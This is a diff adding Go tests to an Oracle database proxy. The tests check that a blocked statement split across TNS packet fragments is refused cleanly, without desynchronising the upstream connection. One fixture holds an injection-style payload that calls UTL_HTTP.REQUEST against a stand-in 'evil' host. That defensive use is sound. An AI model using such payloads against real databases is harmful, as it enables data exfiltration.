@@ -311,6 +311,151 @@ func TestFragmentedStatementIsForwardedWholeAndRecordedWhole(t *testing.T) {
 	p.expectCleanEOF()
 }
 
+// buildJDBCExecOfSize builds the incident's frame shape with a TTC length of
+// exactly total bytes, by padding the statement with trailing spaces. The
+// declared length follows the padding, so the frame stays a frame dbbat decodes
+// by its header rather than by a scan.
+//
+// It is what lets a test place the *end of the message* on a fragment boundary,
+// which is the one alignment where the collector cannot tell "the message ended
+// here" from "one more fragment is coming" by packet size alone.
+func buildJDBCExecOfSize(t *testing.T, sql string, total int) []byte {
+	t.Helper()
+
+	overhead := len(buildLongJDBCExec(sql)) - len(sql)
+
+	require.Greater(t, total-overhead, len(sql),
+		"the statement can only be padded up to the requested size, never trimmed")
+	require.Less(t, total-overhead, 0xFFFF,
+		"padding must not widen the declared length's compressed int, which would move the overhead")
+
+	padded := sql + strings.Repeat(" ", total-overhead-len(sql))
+	frame := buildLongJDBCExec(padded)
+
+	require.Len(t, frame, total, "the fixture has to land on the exact byte")
+
+	return frame
+}
+
+// TestFragmentedRefusalAnswersAnOERWhenTheMessageEndsOnAFragmentBoundary is
+// Goal item 2 in its hardest alignment: a refusal swallows *every* fragment and
+// keeps the session alive even when the message ends exactly on a full-sized
+// packet, where "the last fragment was short" cannot say the message is over.
+//
+// Both shapes of that alignment are covered, because they exercise the two
+// answers the peek can give:
+//
+//   - "ends on the boundary": the message's total length is an exact multiple of
+//     the fragment size, so nothing follows and the peek window closes empty;
+//   - "continues past the boundary": the declared statement is covered by a
+//     full-sized fragment but a short tail fragment is still on the wire, so the
+//     peek picks it up and it is dropped with the rest.
+//
+// In both, the client must get its ORA error and the next statement must travel.
+// The upstream assertion is what pins "every fragment": expectForwarded requires
+// the *next* packet upstream to be the allowed statement, so a stray
+// continuation forwarded on its own would fail it — that stray packet is exactly
+// what desynchronized the upstream before this fix.
+func TestFragmentedRefusalAnswersAnOERWhenTheMessageEndsOnAFragmentBoundary(t *testing.T) {
+	t.Parallel()
+
+	// A statement long enough to fill two fragments, carrying a blocked pattern
+	// past the first one so the refusal is decided on the reassembled text.
+	sql := mergeStatement("x' || UTL_HTTP.REQUEST('http://evil/') || '")
+
+	sizes := map[string]int{
+		// Exactly two full fragments: the message ends on the boundary.
+		"message ends on the boundary": 2 * oracleSDUFragment,
+		// Two full fragments plus a short tail. The declared statement is
+		// covered at the end of fragment 2 — the frame's overhead is 49 bytes
+		// and the shortfall check allows 12 of header — so the collector stops
+		// there and only the peek can discover the tail.
+		"message continues past the boundary": 2*oracleSDUFragment + 19,
+	}
+
+	for name, total := range sizes {
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+
+			grant := &store.Grant{Definition: &store.GrantDefinition{}}
+			p := newFragmentedProbe(t, grant)
+
+			frame := buildJDBCExecOfSize(t, sql, total)
+			written := p.execFragmented(frame)
+
+			require.Len(t, written[0], testSDU, "fragment 0 must be a full SDU-sized packet")
+			require.Len(t, written[1], testSDU, "and so must the one the statement ends on")
+
+			// The alignment this test exists for: the declared statement is
+			// covered at the end of fragment 1's successor and not a byte
+			// later, so the collector stops on a full-sized packet and only the
+			// peek can tell whether the message is over.
+			_, owed := statementFragmentShortfall(frame[:2*oracleSDUFragment])
+			require.False(t, owed,
+				"the fixture must leave nothing owed at the end of a full-sized fragment")
+
+			// The refusal comes back as an ORA error on a live session, not as
+			// a dropped socket.
+			p.expectRefusal(frame, "not permitted through the proxy")
+
+			allowed := buildJDBCExec("SELECT 1 FROM DUAL")
+			p.exec(allowed)
+			p.expectForwarded(allowed)
+
+			p.expectCleanEOF()
+		})
+	}
+}
+
+// TestRefusalWouldStrandFragmentsIsTheFailClosedBackstop pins the guard itself,
+// which the collector no longer reaches: a message whose completeness was never
+// established must refuse by ending the session rather than by answering an OER
+// and leaving a continuation to reach the upstream alone.
+//
+// It is stated on the state rather than through the relay on purpose — that is
+// the point of a backstop. If a future collector path forgets to establish the
+// end of a message, this is what keeps the failure fail-closed instead of a
+// silent upstream desync.
+func TestRefusalWouldStrandFragmentsIsTheFailClosedBackstop(t *testing.T) {
+	t.Parallel()
+
+	full := &TNSPacket{Raw: make([]byte, testSDU)}
+
+	tests := []struct {
+		name string
+		msg  *statementFragments
+		want bool
+	}{
+		{"no fragmented message at all", nil, false},
+		{
+			"a single-packet message strands nothing",
+			&statementFragments{packets: []*TNSPacket{full}},
+			false,
+		},
+		{
+			"a reassembled message known to be complete",
+			&statementFragments{packets: []*TNSPacket{full, full}, complete: true},
+			false,
+		},
+		{
+			"a reassembled message whose end was never established",
+			&statementFragments{packets: []*TNSPacket{full, full}},
+			true,
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+
+			s := newTestSession(nil)
+			s.fragmentedMessage = tc.msg
+
+			assert.Equal(t, tc.want, s.refusalWouldStrandFragments())
+		})
+	}
+}
+
 // TestPartialStatementIsNotGatedAsWhole covers the frames reassembly cannot fix
 // — a statement dbbat holds only a prefix of. It must never go through the
 // validators as if it were the statement: under a grant whose controls depend on
